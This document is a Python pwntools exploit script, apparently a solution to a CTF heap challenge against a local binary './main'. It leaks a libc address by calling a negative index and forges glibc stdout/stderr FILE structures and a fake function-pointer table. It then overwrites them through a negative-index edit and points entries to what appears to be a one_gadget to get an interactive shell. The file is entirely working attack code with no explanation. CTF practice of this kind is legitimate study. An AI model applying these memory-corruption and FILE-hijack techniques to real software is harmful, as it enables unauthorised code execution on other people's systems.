from pwn import*
def add(size,content):		#count <=0x10
	p.sendlineafter('>','1')
	p.sendlineafter('The length of your hw:',str(size)) #0<size<0x80
	p.sendafter('Input your hw:',content)
def show(index):
	p.sendlineafter('>','4')
	p.sendlineafter('index of your hw:',str(index))
def free(index):
	p.sendlineafter('>','3')
	p.sendlineafter('index of your hw:',str(index))
def edit(index,content):
	p.sendlineafter('>','2')
	p.sendlineafter('index of your hw:',str(index))
	p.sendafter('Input your hw:',content)
p = process('./main')
context(arch='amd64',os='linux')
#context.log_level ='debug'
show(-40)
p.recvuntil('Your hw:\n')
libc_base = u64(p.recv(0x1D8)[-8:]) - 0x26AD0
log.info(hex(libc_base))
IO_stderr = flat([
0x00000000FBAD2087, libc_base+0x1BA703,
libc_base+0x1BA703,	libc_base+0x1BA703,
libc_base+0x1BA703,	libc_base+0x1BA703,
libc_base+0x1BA703,	libc_base+0x1BA703,
libc_base+0x1BA704,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0x0000000000000000,	libc_base+0x1BA760,
0x0000000000000002,	0xFFFFFFFFFFFFFFFF,
0x0000000000000000,	libc_base+0x1BC570,
0xFFFFFFFFFFFFFFFF,	0x0000000000000000,
libc_base+0x1B9780,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0x0000000000000000,	libc_base+0x1BB560])
IO_stdout = IO_stderr
IO_stdout +=flat([
0x00000000FBAD2887,	libc_base+0x1BA7E3,
libc_base+0x1BA7E3,	libc_base+0x1BA7E3,
libc_base+0x1BA7E3,	libc_base+0x1BA7E3,
libc_base+0x1BA7E3,	libc_base+0x1BA7E3,
libc_base+0x1BA7E4,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0x0000000000000000,	libc_base+0x1B9A00,
0x0000000000000001,	0xFFFFFFFFFFFFFFFF,
0x000000003E000000,	libc_base+0x1BC580,
0xFFFFFFFFFFFFFFFF,	0x0000000000000000,
libc_base+0x1B98C0,	0x0000000000000000,
0x0000000000000000,	0x0000000000000000,
0x00000000FFFFFFFF,	0x0000000000000000,
0x0000000000000000,	libc_base+0x1BB560])
payload = IO_stdout
payload += flat([
libc_base+0x1BA680,libc_base+0x1BA760,
libc_base+0x1B9A00,libc_base+0x26E20])
payload += flat([
libc_base+0x16AFE0, libc_base+0x16B040,
libc_base+0x16B070, libc_base+0x16B0D0,
libc_base+0x16B310, libc_base+0x16B4E0,
libc_base+0x16B510, libc_base+0x16B540,
libc_base+0x16B5A0, libc_base+0x91030 ,
libc_base+0x16B6C0, libc_base+0x16B700,
libc_base+0x16B710, libc_base+0x16B780,
libc_base+0xF5FD0 , libc_base+0x16B790,
libc_base+0x16B840, libc_base+0x16B880,
libc_base+0x11A190, libc_base+0x16B8A0,
libc_base+0x16B940, libc_base+0x16B910,
libc_base+0x16B9C0, libc_base+0x129490,
libc_base+0x16B9E0, libc_base+0x16BA10,
libc_base+0x16BA40, libc_base+0x16BA70,
libc_base+0x16BAA0, libc_base+0x16BB50])
payload += p64(0)*4
payload += p64(libc_base+0xC84DA)*16
edit(-16,payload)
p.interactive()
